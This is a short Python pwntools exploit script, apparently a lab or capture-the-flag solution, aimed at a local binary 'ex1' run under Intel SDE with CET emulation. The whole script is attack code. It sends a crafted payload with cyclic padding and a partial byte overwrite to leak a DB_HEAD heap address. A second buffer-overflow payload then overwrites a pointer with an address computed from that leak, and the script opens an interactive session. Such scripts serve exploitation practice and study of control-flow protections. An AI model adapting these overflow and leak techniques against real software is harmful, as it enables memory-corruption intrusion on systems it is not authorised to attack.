#!/usr/bin/env python3
from pwn import *

target = process("./sdekit/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./bin/ex1", shell=True)

payload = b'PRINT\0' + cyclic(18) + b'\x90'
target.send(payload)

target.recvline()
target.recvline()
target.recvline()
target.recvline()

db_head_addr = u64(target.recvline().strip(b'> \n').ljust(8, b'\x00'))
print(f"Leaked DB_HEAD address: {hex(db_head_addr)}")

payload = cyclic(48) + p64(db_head_addr + 1124)
target.send(payload)

target.interactive()